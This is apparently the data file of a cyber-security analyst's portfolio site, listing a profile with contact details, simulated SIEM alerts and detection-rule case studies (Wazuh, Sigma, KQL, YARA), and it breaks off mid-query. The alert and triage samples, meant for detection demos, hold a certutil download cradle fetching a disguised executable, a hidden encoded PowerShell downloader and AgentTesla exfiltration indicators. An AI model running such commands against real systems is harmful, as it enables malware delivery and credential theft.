import type {
  CaseStudyProject,
  CertificationItem,
  CyberRangeItem,
  EducationItem,
  ExperienceItem,
  LabWriteupReport,
  ProfileData,
  SiemLogEvent,
  SkillDomain,
  StoryChapter,
  TelemetrySource,
} from '../utils/portfolioLogic';

export const DEFAULT_PROFILE: ProfileData = {
  fullName: 'Sharabu Eswarachari',
  roleTitle: 'Cyber Security Analyst · Blue Team & SOC Operations',
  location: 'Tirupati, AP, India · Open to Remote & Onsite Roles',
  clearanceOrStatus: 'CompTIA Security Analytics Professional (CSAP)',
  yearsInSecOps: 'B.Tech in Cyber Security · SOC Intern @ Sure ProED',
  headline:
    'I help organizations stay safe by spotting cyber threats early, investigating security alerts, and stopping attacks before they cause harm.',
  bio: 'Hi, I am Sharabu Eswarachari — a Cyber Security graduate with hands-on experience working in a Security Operations Center (SOC). During my internship at Sure ProED and across 100+ practical security labs, I focused on a simple mission: helping teams cut through thousands of daily alerts to find real threats across emails, networks, and employee computers.',
  email: 'eswarachari102@gmail.com',
  phone: '+91 9515240481',
  githubHandle: 'github.com/seswarachari',
  githubUrl: 'https://github.com/seswarachari',
  linkedinHandle: 'linkedin.com/in/eswara-chari-51553322a',
  linkedinUrl: 'https://www.linkedin.com/in/eswara-chari-51553322a',
  credlyUrl: 'https://www.credly.com/badges/a7a84b44-434e-48ce-8b12-c119a855dcb7/linked_in_profile',
  resumePdfUrl: '/assets/aistudio/ESWAR_Resume_2393855e.pdf',
  portraitDataUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.32.55_PM_3e1d5418.png',
  portraitStylePreset: 'editorial-dark',
};

export const STORY_CHAPTERS: StoryChapter[] = [
  {
    id: 'chapter-1',
    stepNumber: 'Chapter 01',
    period: '2020 – 2023',
    title: 'Building a Strong Foundation in Computing & Data',
    subtitle: 'Diploma in Computer Science & First Industry Internship at Kriya NextWealth',
    story:
      'My journey started with a curiosity about how computer systems work behind the scenes. While completing my Diploma in Computer Science, I worked as a Data Processing Intern at Kriya NextWealth, where I learned precision, attention to detail, and how to spot small anomalies inside large datasets.',
    takeaway: 'Learned discipline, data accuracy, and how to recognize unusual patterns.',
  },
  {
    id: 'chapter-2',
    stepNumber: 'Chapter 02',
    period: '2023 – 2026',
    title: 'Dedicated Focus on Cyber Security Defense',
    subtitle: 'B.Tech in Cyber Security · Sri Venkateswara College of Engineering',
    story:
      'I chose to specialize in Cyber Security for my B.Tech degree because I wanted to protect people and businesses from digital threats. Instead of just studying theory, I built home labs, practiced solving 102 web security challenges on PortSwigger, and wrote clear guides on how to fix security weaknesses.',
    takeaway: 'Graduated with an 8.0 CGPA and a strong foundation in both how attacks work and how to stop them.',
  },
  {
    id: 'chapter-3',
    stepNumber: 'Chapter 03',
    period: 'June 2025 – Dec 2025',
    title: 'Stepping Into a Real Security Operations Center (SOC)',
    subtitle: 'Cyber Security Intern @ Sure ProED',
    story:
      'At Sure ProED, I worked in a live SOC environment using Splunk. Every day, I monitored security alerts, separated harmless false alarms from real threats, checked systems for vulnerabilities, and assisted with incident response workflows.',
    takeaway: 'Gained practical experience investigating real-time alerts and working calmly under pressure.',
  },
  {
    id: 'chapter-4',
    stepNumber: 'Chapter 04',
    period: '2025 – Present',
    title: 'Backed by Global Certifications & Practical Projects',
    subtitle: 'CompTIA CSAP, CySA+, Security+ & 6 Open-Source Security Tools',
    story:
      'To prove my readiness for day-one impact, I earned 8 industry certifications—including CompTIA CySA+ and Security+—and built 6 practical security tools on GitHub that automatically catch phishing emails, hidden malware, and suspicious network activity.',
    takeaway: 'Ready to contribute immediately as a SOC Analyst, Blue Team Defender, or Security Engineer.',
  },
];

export const LIVE_SIEM_LOGS: SiemLogEvent[] = [
  {
    id: 'evt-wazuh-100010',
    timestamp: 'Scenario 01 · Endpoint Protection',
    source: 'WAZUH-SIEM',
    severity: 'CRITICAL',
    ruleId: 'SID-100010 (Level 12)',
    mitreId: 'T1105',
    mitreTactic: 'Unauthorized File Download',
    hostOrSrc: 'Employee Workstation (WIN11-SOC-WKSTN04)',
    plainTitle: 'Catching a Hacker Hiding Inside a Built-In Windows Tool',
    plainStory:
      'Attackers often use legitimate Windows utilities (like certutil.exe) to quietly download malware so regular antivirus does not block them. Here is how my custom detection rule spots and stops it immediately.',
    investigationSteps: [
      '1. What Triggered the Alert: An employee computer suddenly used a built-in Windows certificate tool to download an unknown program from an external website.',
      '2. How I Investigated: I checked which program started the download and saw it was saving a disguised file into a public folder.',
      '3. What We Confirmed: Normal users never use the certificate tool to download software — this was a confirmed malware download attempt.',
      '4. How We Protected the Company: Disconnected the workstation from the network, removed the downloaded file, and blocked the external website.',
    ],
    summary: 'LOLBin Alert: certutil.exe invoked with -urlcache -split download cradle',
    rawLog: `{"timestamp":"2026-10-25T14:22:08.412Z","rule":{"level":12,"description":"LOLBin: Certutil.exe download cradle detected — possible ingress tool transfer.","id":"100010","mitre":{"id":["T1105"],"tactic":["Command and Control"]}},"agent":{"id":"004","name":"WIN11-SOC-WKSTN04","ip":"10.14.22.104"},"data":{"win":{"system":{"eventID":"1","channel":"Microsoft-Windows-Sysmon/Operational"},"eventdata":{"image":"C:\\\\Windows\\\\System32\\\\certutil.exe","commandLine":"certutil.exe -urlcache -split -f http://198.51.100.42/stage2.exe C:\\\\Users\\\\Public\\\\svchost_update.exe","parentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","user":"CORP\\\\svc_deploy"}}}}`,
    decodedFields: {
      'What Happened': 'Built-in Windows tool used to download an external file',
      'Affected Computer': 'WIN11-SOC-WKSTN04 (10.14.22.104)',
      'Tool Abused': 'certutil.exe (Windows Certificate Utility)',
      'Detection Rule': 'Custom Wazuh Rule 100010 (Authored by Eswar)',
      'Risk Level': 'Critical (94/100) — Immediate Action Required',
    },
    playbookAction:
      'Isolate the workstation from the company network, delete the suspicious file, and block the external IP address at the firewall.',
  },
  {
    id: 'evt-anyrun-agenttesla',
    timestamp: 'Scenario 02 · Malware Investigation',
    source: 'ANY.RUN-SANDBOX',
    severity: 'CRITICAL',
    ruleId: 'AGENTTESLA-SMTP-EXFIL',
    mitreId: 'T1053.005 · T1048.003',
    mitreTactic: 'Password Theft & Data Leak',
    hostOrSrc: 'Sandbox Investigation (AgentTesla Sample)',
    plainTitle: 'Stopping "AgentTesla" Malware from Stealing Browser Passwords',
    plainStory:
      'I safely detonated a real-world password-stealing virus (AgentTesla) inside a secure lab sandbox to see exactly how it hides on a computer and where it tries to send stolen company passwords.',
    investigationSteps: [
      '1. What Triggered the Alert: A suspicious attachment (YWWxWhs.exe) was opened inside our safe testing environment.',
      '2. How I Investigated: I watched the program create a hidden Windows Scheduled Task so it would automatically restart every time the PC rebooted.',
      '3. What We Confirmed: I captured the network traffic and caught the malware trying to email stolen passwords to an attacker server (smtp.godforeu.com).',
      '4. How We Protected the Company: Created a detection rule to block that external server and alert the team if any computer creates a similar startup task.',
    ],
    summary: 'AgentTesla (.NET) spawned schtasks.exe XML persistence & exfiltrated credentials via SMTP 208.91.199.225:587',
    rawLog: `[ANY.RUN DETONATION] sample="YWWxWhs.exe" md5="E0C049B213F76DC3A9133B78EBEB18B8" verdict="MALICIOUS (100/100)" process_chain="YWWxWhs.exe(2636) -> YWWxWhs.exe(2800) -> schtasks.exe(2260)" cmd="C:\\Windows\\System32\\schtasks.exe /Create /TN Updates\\YWWxWhs /XML C:\\Users\\admin\\AppData\\Local\\Temp\\tmpB615.tmp" net_stream="TCP 10.0.0.14:49812 -> 208.91.199.225:587 (smtp.godforeu.com)"`,
    decodedFields: {
      'Malware Identified': 'AgentTesla (Password & Credential Stealer)',
      'How It Hid': 'Created an automatic startup task ("Updates\\YWWxWhs")',
      'Where Data Was Sent': '208.91.199.225 (smtp.godforeu.com) over Email Port 587',
      'Lab Verdict': '100% Confirmed Malicious — Full Evidence Captured',
    },
    playbookAction:
      'Block outbound traffic to 208.91.199.225, remove the hidden startup task, and reset passwords for any affected user accounts.',
  },
  {
    id: 'evt-phish-soar',
    timestamp: 'Scenario 03 · Email Security',
    source: 'PHISH-SOAR',
    severity: 'HIGH',
    ruleId: 'EML-TFIDF-SANDBOX',
    mitreId: 'T1566.001',
    mitreTactic: 'Fake Login Phishing Email',
    hostOrSrc: 'Company Email Gateway (Inbound Mail)',
    plainTitle: 'Automatically Catching a Fake "Urgent Password Reset" Email',
    plainStory:
      'Phishing emails are the #1 way attackers break into companies. I built an automated email analyzer that checks sender authenticity and email wording to catch fake lures without blocking real business emails.',
    investigationSteps: [
      '1. What Triggered the Alert: An email claiming to be from "Microsoft Security" arrived asking an employee to urgently verify their password within 2 hours.',
      '2. How I Investigated: My Phishing Sandbox checked the hidden email headers and saw the sender domain was spelled "micros0ft-auth.com" and failed security checks.',
      '3. What We Confirmed: The Reply-To address pointed to an external attacker inbox and the link led to a fake login page.',
      '4. How We Protected the Company: Automatically quarantined the email before the employee could click the link, with 0% false alarms on real emails.',
    ],
    summary: 'RFC 5322 Phishing Triage: SPF=fail, DMARC=fail, Reply-To mismatch & urgent credential lure (94/100)',
    rawLog: `[EMAIL-PHISHING-SANDBOX] file="urgent_payroll_update.eml" from="security-alert@micros0ft-auth.com" reply_to="collector@evil-drop.ru" spf="fail" dkim="none" dmarc="fail" defanged_url="hxxps://login-micros0ft-verify[.]com/auth" tfidf_probability=0.935 composite_risk=94 verdict="MALICIOUS_QUARANTINED" fpr_benchmark="0.0%"`,
    decodedFields: {
      'Email Subject': 'URGENT: Verify your account credentials within 2 hours',
      'Spoofed Sender': 'security-alert@micros0ft-auth.com (Failed SPF & DMARC)',
      'Fake Link Extracted': 'hxxps://login-micros0ft-verify[.]com/auth',
      'Automated Decision': 'Quarantined Automatically (94/100 Risk Score)',
    },
    playbookAction:
      'Remove the phishing email from all employee inboxes and block the fake login website across the company network.',
  },
  {
    id: 'evt-zeek-beacon',
    timestamp: 'Scenario 04 · Network Monitoring',
    source: 'ZEEK-PCAP-ML',
    severity: 'HIGH',
    ruleId: 'BEACON-ISOFOREST-01',
    mitreId: 'T1071.001',
    mitreTactic: 'Secret Backdoor Check-In',
    hostOrSrc: 'Internal Office PC -> Unknown External Server',
    plainTitle: 'Finding a Hidden Backdoor Communicating Every 60 Seconds',
    plainStory:
      'When advanced attackers infect a computer, their software quietly "checks in" with an outside server every minute to ask for instructions. Humans cannot spot this in millions of logs, so I built a math & AI tool to find that heartbeat.',
    investigationSteps: [
      '1. What Triggered the Alert: An office computer connected to the same unfamiliar overseas server 142 times in a row.',
      '2. How I Investigated: My C2 Beaconing Engine measured the time gap between each connection and found it happened almost exactly every 60 seconds.',
      '3. What We Confirmed: Human web browsing is random, whereas a 60-second clockwork signal is a clear sign of an automated backdoor.',
      '4. How We Protected the Company: Blocked the external server IP and inspected the office computer to remove the hidden program.',
    ],
    summary: 'Covert HTTPS C2 Beacon detected via Inter-Arrival Time Variance (Jitter: 0.06, 142 callbacks)',
    rawLog: `[ZEEK CONN + ISOLATION FOREST] uid="C8kL9p2mQv9x" id.orig_h="10.14.22.108" id.resp_h="185.220.101.44" id.resp_p=443 proto="tcp" service="ssl" callbacks=142 mean_interval=60.02s std_dev=3.61s jitter_coefficient=0.0601 isolation_forest_anomaly=-0.812 verdict="PERIODIC_C2_BEACON"`,
    decodedFields: {
      'Behavior Spotted': 'Computer contacting an unknown server every 60 seconds',
      'Total Connections': '142 automatic check-ins detected',
      'Detection Method': 'Time-Interval Math + Machine Learning (Isolation Forest)',
      'Confirmed Risk': 'High — Automated Backdoor Communication',
    },
    playbookAction:
      'Block communication with 185.220.101.44 at the firewall and run a full forensic scan on workstation 10.14.22.108.',
  },
];

export const SAMPLE_TRIAGE_PAYLOADS = [
  {
    id: 'phishing-eml',
    label: '1. Fake "Urgent Password Reset" Phishing Email',
    category: 'Email Security Triage',
    payload:
      'Authentication-Results: mx.enterprise.io; spf=fail smtp.mailfrom=security-alert@micros0ft-auth.com; dmarc=fail; Subject: URGENT: Verify your account credentials within 2 hours to prevent suspension',
  },
  {
    id: 'agenttesla-smtp',
    label: '2. Password-Stealing Malware (AgentTesla)',
    category: 'Malware Behavior Analysis',
    payload:
      'schtasks.exe /Create /TN "Updates\\YWWxWhs" /XML C:\\Users\\admin\\AppData\\Local\\Temp\\tmpB615.tmp && SMTP AUTH LOGIN dst=208.91.199.225:587 host=smtp.godforeu.com',
  },
  {
    id: 'certutil-cradle',
    label: '3. Suspicious Download Using Windows Tool',
    category: 'Endpoint Alert Triage',
    payload:
      'C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://198.51.100.42/stage2.exe C:\\Users\\Public\\svchost_update.exe',
  },
  {
    id: 'powershell-enc',
    label: '4. Hidden Scrambled PowerShell Script',
    category: 'Script Monitoring',
    payload:
      'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA',
  },
  {
    id: 'c2-beacon-flow',
    label: '5. Secret 60-Second Network Check-In',
    category: 'Network Traffic Hunting',
    payload:
      'src=10.14.22.108 dst=185.220.101.44 dst_port=443 proto=TLSv1.3 beacon_interval=60.0s jitter_ratio=0.06 connections=142',
  },
];

export const INITIAL_PROJECTS: CaseStudyProject[] = [
  {
    id: 'email-phishing-sandbox-triage',
    title: 'Automated Phishing Email Detector & Triage Tool',
    repoName: 'seswarachari/Email-phishing-sandbox',
    repoUrl: 'https://github.com/seswarachari/Email-phishing-sandbox',
    category: 'Phishing & SOAR',
    timeline: '2026 · GitHub Project',
    environment: 'Python · Machine Learning · Email Security',
    mitreTactics: ['Initial Access'],
    mitreTechniqueIds: ['T1566', 'T1566.001', 'T1566.002'],
    problemStatement:
      'Employees receive dozens of emails every day, and a single click on a fake invoice or password-reset link can compromise an entire company. Security teams spend hours manually checking suspicious emails.',
    whatIBuilt:
      'I built an automated tool that safely opens suspicious email files, checks if the sender address is forged, extracts hidden web links, and uses machine learning to score whether the email is a scam.',
    summary:
      'Evaluated on 61 generated emails (30 benign, 31 malicious): the detector had zero false positives across the 30 benign messages and caught 27 of 31 phishing attempts.',
    impactMetric: '0 / 30 false positives · 61 generated emails tested',
    threatScenario:
      'Credential harvesting and malspam campaigns using spoofed sender headers, lookalike domains, urgent social engineering pretexts, and malicious attachment payloads.',
    architectureSummary:
      'Raw .eml File -> RFC 5322 Parser -> Parallel Analysis: Header/Auth + URL/Typosquatting + Static Attachment Inspection + TF-IDF / Logistic Regression -> Weighted Composite Scoring Engine -> Verdict & Incident Report. Evaluation: 61 generated emails (30 benign, 31 malicious).',
    toolsUsed: ['Python', 'Email Security (SPF/DMARC)', 'Machine Learning (TF-IDF)', 'Streamlit Dashboard'],
    repoFiles: ['src/', 'models/', 'dashboard/', 'notebooks/', 'data/', 'reports/'],
    featured: true,
    visualType: 'soar',
    detectionRules: {
      primaryLabel: 'Python EML Triage & TF-IDF Engine',
      wazuhOrPrimary: `# From github.com/seswarachari/Email-phishing-sandbox
def evaluate_eml_artifact(parsed_eml, tfidf_vectorizer, clf_model):
    heuristics_score = 0
    indicators = []
    if "spf=fail" in parsed_eml.auth_results or "dmarc=fail" in parsed_eml.auth_results:
        heuristics_score += 35
        indicators.append("SPF/DMARC Authentication Failure")
    if parsed_eml.from_domain != parsed_eml.reply_to_domain:
        heuristics_score += 25
        indicators.append("Reply-To Domain Mismatch")
    X_vec = tfidf_vectorizer.transform([parsed_eml.subject + " " + parsed_eml.body_text])
    ml_prob = float(clf_model.predict_proba(X_vec)[0][1]) * 40
    total_score = min(100, round(heuristics_score + ml_prob))
    return {"score": total_score, "verdict": "MALICIOUS" if total_score >= 70 else "CLEAN", "indicators": indicators}`,
      kql: `// Defender for Office 365 Phishing & Auth Failure Correlation
EmailEvents
| where EmailDirection == "Inbound"
| where AuthenticationDetails has_any ("spf=fail", "dmarc=fail", "dkim=fail")
| join kind=leftouter EmailUrlInfo on NetworkMessageId
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject, Url, ThreatTypes`,
      thirdLabel: 'YARA Phishing Heuristic Rule',
      sigmaOrPython: `rule Suspicious_Phishing_EML_Header_And_Lure {
    meta:
        author = "Sharabu Eswarachari"
        mitre = "T1566.001"
    strings:
        $auth_fail1 = "spf=fail" nocase
        $auth_fail2 = "dmarc=fail" nocase
        $lure1 = "verify your account" nocase
        $lure2 = "immediate action required" nocase
    condition:
        ($auth_fail1 or $auth_fail2) and ($lure1 or $lure2)
}`,
    },
  },
  {
    id: 'wazuh-siem-detection-lab',
    title: 'Company Security Monitoring Lab (Wazuh SIEM)',
    repoName: 'seswarachari/SIEM-Detection-Engineering-',
    repoUrl: 'https://github.com/seswarachari/SIEM-Detection-Engineering-',
    category: 'SIEM & Detection',
    timeline: '2026 · GitHub Project',
    environment: 'Wazuh SIEM · Windows 10/11 · Python',
    mitreTactics: ['Execution', 'Command and Control', 'Persistence', 'Credential Access'],
    mitreTechniqueIds: ['T1105', 'T1059.001', 'T1110', 'T1053.005'],
    problemStatement:
      'Standard security software often misses attackers who log in with stolen passwords or use built-in Windows programs to carry out attacks.',
    whatIBuilt:
      'I set up a complete Security Operations Center (SOC) lab at home using Wazuh SIEM, wrote custom alert rules for Windows computers, tested them against simulated cyber attacks, and automated summary reports in Python.',
    summary:
      'Built an end-to-end security monitoring pipeline for Windows computers that detects password-guessing attacks, hidden PowerShell scripts, and unauthorized file downloads, then automatically generates clean incident reports.',
    impactMetric: '5 Custom Alert Rule Suites · Automated Incident Summary Reports',
    threatScenario:
      'Adversaries abusing certutil.exe (-urlcache) for ingress tool transfer (T1105), executing Base64-encoded hidden PowerShell commands (T1059.001), and establishing Registry Run Key / Schtasks persistence.',
    architectureSummary:
      'Windows 10/11 Endpoint (Tuned Sysmon v14 + Atomic Red Team) -> Wazuh Agent -> Wazuh Manager (Custom XML Decoders & Rules 100010–100032) -> Python export_wazuh_alerts.py & generate_alert_summary.py -> Markdown Incident Reports.',
    toolsUsed: ['Wazuh SIEM', 'Windows Event Logs', 'Sysmon', 'Python Automation', 'Attack Simulation'],
    repoFiles: [
      'wazuh_rules/custom_lolbin_rules.xml',
      'wazuh_rules/custom_powershell_rules.xml',
      'wazuh_rules/custom_bruteforce_rules.xml',
      'wazuh_rules/custom_persistence_rules.xml',
      'sysmon_config/sysmon_config.xml',
      'src/export_wazuh_alerts.py',
    ],
    featured: true,
    visualType: 'siem',
    detectionRules: {
      primaryLabel: 'Wazuh XML (Custom Rules)',
      wazuhOrPrimary: `<!-- From github.com/seswarachari/SIEM-Detection-Engineering-/wazuh_rules -->
<group name="custom_lolbin,custom_powershell,sysmon,">
  <!-- Rule 100010: Certutil Download Cradle (MITRE T1105) -->
  <rule id="100010" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\\\certutil\\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-urlcache</field>
    <description>LOLBin: Certutil.exe download cradle detected — possible ingress tool transfer.</description>
    <mitre><id>T1105</id></mitre>
    <group>attack,lolbin,ingress_tool_transfer,</group>
  </rule>

  <!-- Rule 100030: PowerShell Encoded Command Execution (MITRE T1059.001) -->
  <rule id="100030" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)powershell\\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc\\s|-encodedcommand\\s)</field>
    <description>Suspicious PowerShell: Encoded command execution detected (T1059.001)</description>
    <mitre><id>T1059.001</id></mitre>
    <group>attack,powershell,</group>
  </rule>
</group>`,
      kql: `// Equivalent Microsoft Sentinel KQL Query for Sysmon EventID 1
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "powershell.exe", "mshta.exe")
| where ProcessCommandLine has_any ("-urlcache", "-enc", "-EncodedCommand", "-w hidden")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName`,
      thirdLabel: 'Splunk SPL',
      sigmaOrPython: `index=wazuh OR index=wineventlog EventCode=1
| where (match(Image, "(?i)\\\\certutil\\.exe$") AND match(CommandLine, "(?i)-urlcache"))
   OR (match(Image, "(?i)powershell\\.exe$") AND match(CommandLine, "(?i)(-enc|-encodedcommand)"))
| stats count values(CommandLine) as Commands by _time, host, User, Image`,
    },
  },
  {
    id: 'agenttesla-malware-dynamic-analysis',
    title: 'Real-World Malware Investigation: Stopping "AgentTesla" Password Theft',
    repoName: 'LetsDefend & ANY.RUN Investigation',
    repoUrl: 'https://www.linkedin.com/in/eswara-chari-51553322a',
    category: 'SIEM & Detection',
    timeline: '2026 · Malware Case Study',
    environment: 'ANY.RUN Sandbox · Network Forensics · LetsDefend',
    mitreTactics: ['Persistence', 'Credential Access', 'Exfiltration', 'Defense Evasion'],
    mitreTechniqueIds: ['T1053.005', 'T1555.003', 'T1048.003', 'T1027'],
    problemStatement:
      'When a suspicious file is found on a company computer, security analysts need to quickly know: What does this file do, how does it hide, and did it steal any company data?',
    whatIBuilt:
      'I safely detonated a real-world "AgentTesla" malware sample inside an isolated sandbox, traced every step it took on the computer, and captured the exact server address where it tried to email stolen passwords.',
    summary:
      'Investigated a live password-stealing virus (AgentTesla) in ANY.RUN, uncovering how it created a hidden startup task on Windows and catching it sending stolen credentials to an external server (208.91.199.225).',
    impactMetric: '100% Malware Behavior Mapped · Extracted Attacker Server & Startup Task',
    threatScenario:
      'InfoStealer payload (YWWxWhs.exe) harvesting saved browser credentials, system profile metadata, and clipboard data, establishing scheduled task persistence, and exfiltrating stolen credentials via Base64-authenticated SMTP.',
    architectureSummary:
      'Sample Detonation (YWWxWhs.exe, PID 2636) -> Child Process Chain (YWWxWhs.exe PID 2800, then schtasks.exe PID 2260) -> Persistence XML Task "Updates\\YWWxWhs" -> Outbound SMTP Exfiltration (208.91.199.225:587 / smtp.godforeu.com) -> IOC & YARA Rule Authoring.',
    toolsUsed: ['ANY.RUN Sandbox', 'LetsDefend', 'Process Tree Analysis', 'Network Traffic Inspection', 'Wazuh Rules'],
    repoFiles: [
      'ANYRUN_Process_Tree_1771326015554.jpeg',
      'ANYRUN_SMTP_Stream_1771326012628.jpeg',
      'AgentTesla_IOC_Report.md',
    ],
    featured: true,
    visualType: 'forensics',
    previewImageUrl: '/assets/aistudio/1771326015554_39223381.jpeg',
    detectionRules: {
      primaryLabel: 'Wazuh XML (AgentTesla Schtasks & SMTP)',
      wazuhOrPrimary: `<!-- Detection for AgentTesla Scheduled Task XML Persistence (T1053.005) -->
<rule id="100026" level="13">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image" type="pcre2">(?i)\\\\schtasks\\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/Create.*(/XML|AppData\\\\Local\\\\Temp)</field>
  <description>AgentTesla Behavior: Scheduled Task created from Temp XML artifact (T1053.005)</description>
  <mitre><id>T1053.005</id></mitre>
</rule>`,
      kql: `// Sentinel KQL: AgentTesla Schtasks Temp XML + Outbound Port 587 SMTP Exfiltration
DeviceProcessEvents
| where FileName =~ "schtasks.exe" and ProcessCommandLine has_all ("/Create", "/XML", "Temp")
| join kind=inner (
    DeviceNetworkEvents
    | where RemotePort in (25, 465, 587) or RemoteIP == "208.91.199.225"
) on DeviceId`,
      thirdLabel: 'Extracted IOCs & Artifacts',
      sigmaOrPython: `# Extracted Indicators of Compromise (ANY.RUN Dynamic Analysis)
Malware_Family: AgentTesla (.NET InfoStealer)
MD5_Hash: E0C049B213F76DC3A9133B78EBEB18B8
Process_Chain: YWWxWhs.exe (PID 2636) -> YWWxWhs.exe (PID 2800) -> schtasks.exe (PID 2260)
Persistence_Cmd: "C:\\Windows\\System32\\schtasks.exe" /Create /TN "Updates\\YWWxWhs" /XML "C:\\Users\\admin\\AppData\\Local\\Temp\\tmpB615.tmp"
Exfil_Server: 208.91.199.225:587 (smtp.godforeu.com) — SMTP AUTH LOGIN`,
    },
  },
  {
    id: 'iot-malware-ensemble-dnn',
    title: 'Protecting Smart Devices (IoT) from Cyber Attacks Using AI',
    repoName: 'seswarachari/iot-malware-classification',
    repoUrl: 'https://github.com/seswarachari/iot-malware-classification',
    category: 'Threat Hunting & ML',
    timeline: '2026 · B.Tech Final Year Project',
    environment: 'Python · Machine Learning · Live Dashboard',
    mitreTactics: ['Impact', 'Command and Control', 'Discovery'],
    mitreTechniqueIds: ['T1498', 'T1499', 'T1046', 'T1071'],
    problemStatement:
      'Smart cameras, sensors, and office IoT devices rarely have built-in security, making them easy targets for hackers to hijack into massive "Mirai" botnets that crash company networks.',
    whatIBuilt:
      'For my B.Tech final-year project, I compared 9 models on CICIoT2023 traffic and combined the top 3 in a live dashboard. The ensemble reached 92.27% test accuracy on a stratified 80/20 split.',
    summary:
      'An AI-powered network defense model classifies five CICIoT2023 traffic types. Its ensemble reached 92.27% accuracy on a stratified held-out test split.',
    impactMetric: '92.27% test accuracy · 5 CICIoT2023 classes',
    threatScenario:
      'Compromised IoT devices inducted into Mirai botnets and launching high-volume HTTP Flood, SYN Flood, DDoS, and MITM/DNS spoofing attacks across enterprise and smart infrastructure.',
    architectureSummary:
      'CICIoT2023 network flow CSV -> Feature scaling and selection -> 9-model benchmark -> Stratified 80/20 train/test split -> Soft-voting ensemble (Gradient Boosting + Random Forest + XGBoost, 92.27% test accuracy) -> Streamlit traffic analyzer.',
    toolsUsed: ['Python', 'Machine Learning (XGBoost & Random Forest)', 'Deep Learning', 'Streamlit Dashboard'],
    repoFiles: [
      'CIC_IOT_improved-4.ipynb',
      'cic-iot.ipynb',
      'DDoS-HTTP_Flood-.pcap.csv',
      'UI/',
      'UI DASHBOARD .png',
    ],
    featured: true,
    visualType: 'hunting',
    detectionRules: {
      primaryLabel: 'Model Benchmark & Ensemble',
      wazuhOrPrimary: `# From github.com/seswarachari/iot-malware-classification
# CICIoT2023 5-Class Network Traffic Classification Results:
# Classes: ['benign', 'ddos', 'dos', 'mirai', 'other_attack']
MODEL_BENCHMARKS = {
    "KNN": 0.8291,
    "LSTM (Deep Learning)": 0.8443,
    "1D-CNN (Deep Learning)": 0.8784,
    "Extra Trees": 0.8978,
    "Decision Tree": 0.9048,
    "Random Forest": 0.9179,
    "XGBoost": 0.9218,
    "Gradient Boosting": 0.9226,
    "Ensemble Voting (GB + RF + XGB)": 0.9227,  # Top Performing Architecture
}`,
      kql: `// Network Flow Telemetry Anomaly Hunt for Mirai & DDoS Floods
CommonSecurityLog
| where DestinationPort in (23, 2323, 80, 443, 5555)
| summarize PacketCount = count(), DistinctTargets = dcount(DestinationIP), AvgBytes = avg(SentBytes)
    by SourceIP, bin(TimeGenerated, 1m)
| where PacketCount > 2500 or DistinctTargets > 50`,
      thirdLabel: 'Zeek / Suricata Alert Correlation',
      sigmaOrPython: `index=zeek sourcetype="zeek:conn"
| stats count as flow_count sum(orig_bytes) as total_bytes dc(id.resp_h) as unique_hosts by id.orig_h, service
| where flow_count > 1000 OR unique_hosts > 40
| eval traffic_class = if(unique_hosts > 40, "mirai_scan_or_ddos", "dos_flood")`,
    },
  },
  {
    id: 'lolbins-hybrid-detection-engine',
    title: 'Catching Attackers Who Hide Inside Trusted Windows Tools (LOLBins)',
    repoName: 'seswarachari/lolbins-detection-engine',
    repoUrl: 'https://github.com/seswarachari/lolbins-detection-engine',
    category: 'SIEM & Detection',
    timeline: '2026 · GitHub Project',
    environment: 'Python · Sigma Rules · Behavioral AI',
    mitreTactics: ['Defense Evasion', 'Execution', 'Privilege Escalation'],
    mitreTechniqueIds: ['T1218', 'T1218.005', 'T1105', 'T1059.003'],
    problemStatement:
      'Modern hackers rarely bring their own virus files anymore. Instead, they abuse pre-installed Microsoft tools (like PowerShell or Certutil) so traditional antivirus software thinks nothing is wrong.',
    whatIBuilt:
      'I created a 3-layer detection system that combines written security rules with anomaly-detection AI to spot when a trusted Windows program is being used in an unusual or dangerous way.',
    summary:
      'A 3-layer defense engine that catches attackers abusing legitimate Windows utilities by combining industry-standard Sigma rules with machine-learning behavior analysis.',
    impactMetric: '3-Layer Defense System · Automated Risk Scoring Dashboard',
    threatScenario:
      'Attackers leveraging Microsoft-signed binaries (certutil.exe, mshta.exe, rundll32.exe) with obfuscated command-line arguments and abnormal parent-child process relationships to evade signature AV.',
    architectureSummary:
      'Windows Telemetry & Synthetic Events -> Feature Engineering -> Parallel Detection: Sigma Rules + ML Anomaly Scoring + Process-Chain Analysis -> Detection Fusion & Risk Scoring -> Alerts, Dashboard & Evaluation Reports.',
    toolsUsed: ['Python', 'Sigma Detection Rules', 'Anomaly Detection ML', 'Windows Event Logs'],
    repoFiles: [
      'rules/sigma_rules',
      'src/',
      'models/',
      'dashboard/',
      'tests/',
      'Project_Explanation.pdf',
    ],
    featured: true,
    visualType: 'forensics',
    detectionRules: {
      primaryLabel: 'Sigma YAML Rule',
      wazuhOrPrimary: `# From github.com/seswarachari/lolbins-detection-engine/rules/sigma_rules
title: Suspicious LOLBin Proxy Execution and Download Cradle
status: production
logsource:
  category: process_creation
  product: windows
detection:
  selection_lolbins:
    Image|endswith:
      - '\\certutil.exe'
      - '\\mshta.exe'
      - '\\regsvr32.exe'
      - '\\rundll32.exe'
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - 'http://'
      - 'https://'
      - 'javascript:'
      - 'scrobj.dll'
  condition: selection_lolbins and selection_flags
level: high`,
      kql: `// Sentinel KQL: High-Entropy LOLBin Command Line & Rare Parent Process
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe")
| extend CmdLength = strlen(ProcessCommandLine)
| where CmdLength > 120 or ProcessCommandLine has_any ("http", "scrobj.dll", "-urlcache")
